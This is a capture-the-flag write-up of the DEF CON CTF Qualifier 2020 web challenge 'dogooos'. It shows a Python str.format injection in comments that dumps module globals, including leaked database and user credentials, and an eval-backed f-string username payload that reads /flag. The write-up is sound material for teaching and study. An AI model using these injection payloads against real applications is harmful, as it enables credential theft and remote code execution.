<h1>DEF CON CTF Qualifier 2020 â€“ dogooos</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 151</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>DogOOOs is a new website where members can rate pictures of dogs. We think there might still be a few bugs, can you check it out? In this challenge, the flag is located in the root directory of the server at /flag.</p>
  
  <p>http://dogooos.challenges.ooo:37453</p>
  
  <p>dogooos.challenges.ooo 37453</p>
  
  <p>Files:</p>
  
  <p><a href="dogooo_comments.py">dogooo_comments.py</a> a881e06d1d70809ffdc9149a5be5b5de6796542f2ed2225fd43d451fde2c8c78</p>
  
  <p><a href="loaddata.py">loaddata.py</a> 0b57622ec86e02c0d8726538161dffb1e13ba1a18b7538354c12f762e4947c23</p>
</blockquote>

<p><a href="https://github.com/o-o-overflow/dc2020q-dogooos-public">Official solution here.</a></p>

<h2>Solution</h2>

<p>The website allows you to upload and comment pictures of dogs.</p>

<p>There is an interesting endpoint at <code>/dogooo/runcmd</code> that contains a remote shell functionality, but it can't be used due to an <code>HTTP 502 Bad Gateway</code> error caused by the presence of <code>seccomp</code> filter, which prevents <code>execve</code>.</p>

<p>Several functionalities can be used only by authenticated users (i.e. <code>@login_required</code> annotations). There is an endpoint that can be used to create new users (i.e. <code>/dogooo/user/create</code>), but even this functionality requires the login.</p>

<p>A public functionality is the <code>/dogooo/deets/&lt;postid&gt;</code> that can be used to insert a new comment under a picture.</p>

<p>The comment is inserted with a two-step procedure:
1. the comment is inserted like a preview and showed into the webpage;
2. the content of the comment is strictly validated and inserted into the database.</p>

<p>Analyzing the code for the first step, in the <a href="loaddata.py">loaddata.py</a> file, an interesting line of code can be found into <code>get_comments</code> function.</p>

<p>```python
def get<em>comments(self):
    out = ""
    for ccnt, cmt in enumerate(self.comments):
        fmt</em>cmt = cmt.comment.format(rating=self.<strong>dict</strong>)
        form<em>save = f"""
            <form action="/dogooo/deets/add/{self.id}" method="POST">
                <input type=hidden id="comment" name="comment" value='{fmt</em>cmt}'></textarea>
                <input type=hidden id="commenter" name="commenter" value='{cmt.author}'/>
                <input type=submit value="Save" />
            </form>
        """
        if cmt.preview:
            out += f"<ul class='square'>{fmt<em>cmt} - {cmt.author} {form</em>save} </ul>\n"
        else:
            out += f"<ul class='square'>{fmt_cmt} - {cmt.author}</ul>\n"</p>

<pre><code>return out
</code></pre>

<p>```</p>

<p>The interesting line is the following.</p>

<p><code>
fmt_cmt = cmt.comment.format(rating=self.__dict__)
</code></p>

<p>It seems that if you use a format string like <code>{rating}</code> into the comment text, then the content of <code>self.__dict__</code> can be printed.</p>

<p>Trying it, the following content will be printed into the preview webpage.</p>

<p><code>html
&lt;ul class='square'&gt;{'id': 3, 'rating': 13, '_message': "This is Griffey. His St. Patrick's Day bow tie didn't arrive until this morning. Politely requests that everyone celebrate again. 13/10", 'pic_loc': 'images/img_3.jpg', 'author': 'demidog', 'comments': [&lt;app.loaddata.Comment object at 0x7fc4eaadf160&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf1f0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf1c0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf280&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf3d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf430&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf490&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf4f0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf550&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf5b0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf610&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf670&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf6d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf730&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf790&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf7f0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf850&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf8b0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf910&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf970&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadf9d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfa30&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfa90&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfaf0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfb50&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfbb0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfc10&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfc70&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfcd0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfd30&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfd90&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfdf0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfe50&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadfeb0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadff10&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadff70&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaadffd0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6070&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae60d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6130&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6190&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae61f0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6250&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae62b0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6310&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6370&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae63d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6430&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6490&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae64f0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6550&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae65b0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6610&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6670&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae66d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6730&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6790&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae67f0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6850&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae68b0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6910&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6970&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae69d0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6a30&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6a90&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6af0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6b50&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6bb0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6c10&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6c70&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6cd0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6d30&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6d90&gt;, &lt;app.loaddata.Comment object at 0x7fc4eaae6df0&gt;, &lt;app.loaddata.Comment object at 0x7fc4eab30af0&gt;]} - author
</code></p>

<p>As you can read <a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/">here</a>, this code can be abused to read secret data.</p>

<p>The following code can be used to access <em>globals</em> objects.</p>

<p><code>python
{rating[comments][0].__class__.__init__.__globals__}
</code></p>

<p>It will give the following output.</p>

<p>``<code>html
&lt;ul class='square'&gt;{'__name__': 'app.loaddata', '__doc__': None, '__package__': 'app', '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fc4ed1f4670&gt;, '__spec__': ModuleSpec(name='app.loaddata', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x7fc4ed1f4670&gt;, origin='./app/loaddata.py'), '__file__': './app/loaddata.py', '__cached__': './app/__pycache__/loaddata.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the</code>nil' object; Ellipsis represents `...' in slices.", '<strong>package</strong>': '', '<strong>loader</strong>': <class '<em>frozen</em>importlib.BuiltinImporter'>, '<strong>spec</strong>': ModuleSpec(name='builtins', loader=<class '<em>frozen</em>importlib.BuiltinImporter'>), '<strong>build<em>class</strong>': <built-in function <strong>build</em>class</strong>&gt;, '<strong>import</strong>': <built-in function <strong>import</strong>&gt;, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '<strong>debug</strong>': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2020 Python Software Foundation.
All Rights Reserved.</p>

<p>Copyright (c) 2000 BeOpen.com.
All Rights Reserved.</p>

<p>Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.</p>

<p>Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'connect': <function Connect at 0x7fc4ed0c4700>, 'f': <class 'fstring.fstring.fstring'>, 'clean': <function clean at 0x7fc4ed09f310>, 'json': <module 'json' from '/usr/lib/python3.8/json/<strong>init</strong>.py'>, 'post<em>results': ((3, "This is Griffey. His St. Patrick's Day bow tie didn't arrive until this morning. Politely requests that everyone celebrate again. 13/10", 2, 13, 'images/img</em>3.jpg', 2, 'demidog', 'princesses<em>password'),), 'jf': &lt;</em>io.TextIOWrapper name='/dbcreds.json' mode='r' encoding='UTF-8'>, 'jdata': {'db<em>user': 'dogooo', 'db</em>pass': 'dogZgoneWild'}, 'db<em>user': 'dogooo', 'db</em>pass': 'dogZgoneWild', 'Comment': <class 'app.loaddata.Comment'>, 'Post': <class 'app.loaddata.Post'>, 'get<em>posting': <function get</em>posting at 0x7fc4ed1fe940>, 'UserMixin': <class 'flask<em>login.mixins.UserMixin'>, 'save</em>comment': <function save<em>comment at 0x7fc4eb2819d0>, 'get</em>all<em>posts': <function get</em>all<em>posts at 0x7fc4eb281af0>, 'create</em>post<em>entry': <function create</em>post<em>entry at 0x7fc4eab0c0d0>, 'User': <class 'app.loaddata.User'>, 'user</em>create<em>entry': <function user</em>create<em>entry at 0x7fc4eab1c040>, 'get</em>login': <function get<em>login at 0x7fc4eab1c280>, 'get</em>user': <function get_user at 0x7fc4eab1c310>} - author
```</p>

<p>From this data you can spot user credentials:
* username: <code>demidog</code>;
* password: <code>princesses_password</code>;</p>

<p>So now you can authenticate into the system and <strong>you can create new users</strong>.</p>

<p>During the authentication, an interesting behavior can be spot. The <code>login</code> method (<a href="dogooo_comments.py">dogooo_comments.py</a>) uses the <em>f-Strings</em> functionality of Python 3, <a href="https://realpython.com/python-f-strings/">which is a very powerful formatting syntax</a> and can be used to call methods.</p>

<p>```python
@app.route("/dogooo/login", methods=["GET", "POST"])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get<em>login(username, password)
        if user is not None:
            login</em>user(user)
            return redirect(request.host<em>url[:-1] + f"/dogooo/show?message=Welcom+back+{user.get</em>user_info()}")</p>

<pre><code>    else:
        return redirect(request.host_url[:-1] + f"/dogooo/show?message=Login+FAILED")
else:
    return abort(401)
</code></pre>

<p>```</p>

<p>The interesting line is the following.</p>

<p><code>python
return redirect(request.host_url[:-1] + f"/dogooo/show?message=Welcom+back+{user.get_user_info()}")
</code></p>

<p>The <code>get_user_info</code> method of the <code>User</code> class into <a href="loaddata.py">loaddata.py</a> uses the <code>f()</code> method, instead of the <code>f""</code> one, on the <code>username</code> field; this method is the legacy one of <em>f-Strings</em> Python 2 implementation. The library implemented the <em>f-Strings</em> functionality by using an <code>eval</code>.</p>

<p><code>python
from fstring import fstring as f
...   ...   ...
def get_user_info(self):
    return f(self.username)
</code></p>

<p>So you can create a new user with a malicious username that could trigger a RCE during the authentication. The malicious username is: <code>{open('/flag').read()}</code>.</p>

<p>Authenticating with this user, you will be redirect to the following address.</p>

<p><code>
http://dogooos.challenges.ooo:37453/dogooo/show?message=Welcom+back+OOO%7Bdid%20you%20see%20my%20dog%7D
</code></p>

<p>Which contains the flag in the URL.</p>

<p><img src="flag.png" alt="flag.png" /></p>

<p>So the flag is the following.</p>

<p><code>
OOO{did you see my dog}
</code></p>
